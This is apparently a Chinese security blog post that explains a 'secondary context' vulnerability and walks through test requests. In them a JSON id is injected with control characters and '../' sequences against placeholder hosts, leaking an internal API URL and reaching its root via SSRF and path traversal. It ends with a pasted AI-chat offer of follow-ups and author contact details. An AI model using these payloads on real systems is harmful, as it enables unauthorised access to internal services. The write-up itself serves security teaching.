#  我是如何利用二级上下文漏洞触发后端 API 调用中的 SSRF 和路径遍历攻击的  
haidragon
                    haidragon  安全狗的自我修养   2026-02-06 06:54  
  
# 官网：http://securitytech.cc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnsUicJ1YmAh9gJE5dw6EVcfXC5dJVRSpdibqAJ36X01z5nYIBrUMxGTMUc4ZHsatwFdAwd59KFubFzzmcdttljtMwySe4ibFP51qE/640?wx_fmt=png&from=appmsg "")  
# 现代网站架构  
  
在现代架构中，前端参数和路径通常会经过多个后端层级进行传递（relay），例如：  
- BFF（Backend for Frontend）  
  
- API Gateway  
  
- 微服务  
  
当请求被不断转换和转发时，同一份用户输入可能会在**不同上下文中被重复使用**  
（例如被用来调用内部接口），但却**没有针对新上下文重新做校验**  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntX7JXQdLtV2STqnPUrDAIQZj9gSNGHsjQTaPA7ibfLUKPglujiahqPllWBHpBqXDiaibGTuroicZsbF0Y507QAFKT669aIMS2rrmiac/640?wx_fmt=png&from=appmsg "")  
## ✅ 什么是 Secondary Context Vulnerability（二次上下文漏洞）？  
  
**二次上下文漏洞**  
指的是：  
  
用户可控输入**最初在一个上下文中被处理**  
，但之后又在**另一个上下文中被重新使用或解释**  
，而这个新的上下文中却**没有进行正确的校验或过滤**  
。  
  
在**主上下文（Primary Context）**中，输入看起来可能是安全的，比如：  
- JSON 里的数字 ID  
  
- 表单参数  
  
但当这个输入后来被嵌入到另一个执行环境中时，比如：  
- URL 路径  
  
- 文件系统路径  
  
- SQL 查询  
  
- 模板  
  
- 命令执行  
  
它就可能获得**新的语义含义**  
，从而触发意外行为。  
  
👉 漏洞的本质不在于输入本身，而在于：  
**错误地假设“在一个上下文中校验过的输入，在其他上下文中仍然安全”。**  
## 🧪 Step #1：注入控制字符，检测参数是否在后端被二次使用  
  
测试 **Secondary Context**  
 漏洞的第一条经验法则是：  
  
👉 向参数中插入控制字符：  
```
#  ?  /
```  
### 📌 示例场景  
  
在前端接口中有如下参数：  
```
GET /product-count HTTP/1.1Host: graphiql.TARGET.com{"id":123}
```  
  
而这个 **id**  
 的值在后端被用来调用内部 API：  
```
ashoputils.internal_target.com/{123}/somepath/
```  
### 可视化结构：  
  
👉 Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnt2Jw8ARhoSK8RHyeDjibIs3NjmYmI2U8evhBGT9BpfX4MyCa8abYYVvjO4licabZ2QI1SmcJrKnw0FmPWunpo8ibuPZERtQRestU/640?wx_fmt=png&from=appmsg "")  
  
**正常流程（Normal Flow）**  
### 🔧 注入控制字符测试  
- 插入 ?  
123  
 后面的内容会被当作参数  
```
ashoputils.internal_target.com/{123}?/somepath/
```  
  
- 插入 #  
123  
 后面的内容会被忽略  
```
ashoputils.internal_target.com/{123}#/somepath/
```  
  
- 插入 /  
  
可能会暴露服务器路径结构（404 等错误）  
```
ashoputils.internal_target.com/{123}//somepath/
```  
  
> **作者说明：**  
  
在我的案例中，这一步并没有直接返回能证明 id  
 被后端使用的结果。  
  
### 📸 测试截图  
  
👉 Appending /  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvjYrZpTibs9TyKbZACfH4Gkzdw7pRibjwIiaPIbUrIFskw0wDO8a9kkMm98R9z3CtV8ALiccEZtyJqTWBmeBN7FCqTxbib89QT3eibs/640?wx_fmt=png&from=appmsg "")  
  
👉 Appending ?  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvDme7uvwQxXToicHMHwxiaOMAKeYmaNlia3LjASFQRAfeywqOQpLjBoEKpAoZS6XrxFqmRngBv4CjeicR1vnOR46H8ETIGbl6dXHc/640?wx_fmt=png&from=appmsg "")  
  
👉 Appending #  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvpb5obnlNkMGdkVDodwNWIzHicdiboVBVyoQcGvDD4cB3a6XBruPZrJhEteZ3icsyjNAMzexC0t5kibfPGicxcFKt74oHicNlD70MDU/640?wx_fmt=png&from=appmsg "")  
## 🧪 Step #2：加入随机内容，触发内部 API 报错  
  
既然第一步没效果，我尝试加入随机内容，很快就得到了来自**内部 API 的错误响应**  
，并且直接暴露了内部接口。  
### 📌 Payload 示例  
```
GET /product-count HTTP/1.1Host: graphiql.TARGET.com{"id":"62/aaa"}
```  
### 📌 返回结果  
```
HTTP 200 OK{"data":    {"method":"get","url":"https://ashoputils.INTERNAL_TARGET.com/count-product-transaction/62//aaa","headers":{"Content-Type":"application/json"}    }}
```  
  
👉 从返回中可以看到：  
- 内部 API 地址  
  
- HTTP 方法  
  
- id 参数被直接拼接到内部请求路径中  
  
👉 Injecting // triggers the error  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnuuUQySBy4dcsk0Xfibw8hQuribyZoehAb8n7FTSfjJQnxWMvJ58S1O4J6TWW3lZonaysc38p1r1Uyic6LQ7Ga1EPDwknsup8rZvw/640?wx_fmt=png&from=appmsg "")  
  
**注入 // 触发内部微服务暴露**  
## 🔥 进一步利用：Path Traversal  
  
之后我继续注入：  
```
GET /product-count HTTP/1.1Host: graphiql.TARGET.com{"id":"62/../../"}
```  
### 📌 返回结果  
```
HTTP 200 OKHEYHO(内部 API 根目录内容)
```  
  
👉 返回 HEYHO  
 表示已经访问到了 INTERNAL_TARGET 的根路径。  
  
👉 Injecting /../…/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnvoUJxiag3vUMdVuAG66Xexv7wScngibmTEYAtMSAPF48SVBVqkjOsYJkMe0aOzqH04BImANbEB9udAOBuriaaACGdjnR5DJljraA/640?wx_fmt=png&from=appmsg "")  
## 📊 利用流程可视化  
  
👉 Normal Flow  
  
![](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBntkb2l5kYzLWEM84Zbw84Gb5M9MleU6mRbmUEJKTFTpK3ac7nBZCrQZaSet6HF6DMicQNAkzlRWvvTYicVJuialh3VLicDlKd2NviaQ/640?wx_fmt=png&from=appmsg "")  
  
👉 Exploitation Flow  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuv6210IBglXzrYx0ZWUPR58I4BjwVZzcIJJnv6rAVI87hgjQdh52U1jxTwf0iaA2auPbp3fc1MV2MIsiaKz1a20jCRNbibjJDPzY/640?wx_fmt=png&from=appmsg "")  
## 🚀 进一步利用方向  
  
现在你已经理解这个漏洞的核心了：  
- 从 TARGET.COM  
 访问到了 INTERNAL_TARGET.COM  
  
- 本质上属于 **SSRF**  
  
- 结合 **Path Traversal**  
  
- 可以控制内部 API 的访问路径  
  
- 可能读取敏感文件或内部接口  
  
👉 最终效果：  
```
External → BFF → Internal API → Arbitrary Path Control
```  
## 🧠 一句话总结  
  
**Secondary Context Vulnerability 的本质是：“在一个上下文安全的输入，在另一个上下文中变成了攻击载体。”**  
  
如果你要，我可以再给你：  
- ✅ 攻防视角总结版  
  
- ✅ 自动化测试思路  
  
- ✅ Burp 实战检测 checklist  
  
- ✅ 漏洞修复规范（开发视角）  
  
直接说：  
  
👉 来个修复方案  
  
👉 来个检测脚本思路  
  
👉 整理成博客风格  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
##   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vBZcZNVQERGMBGbdxsdiaj8ZUicr210FQ092YpsgXmyaqwxqPcvPlLaxq84Ndm9Anx4IKy9ibuvaC5s4HFrpTw1ew/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=15 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
****- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
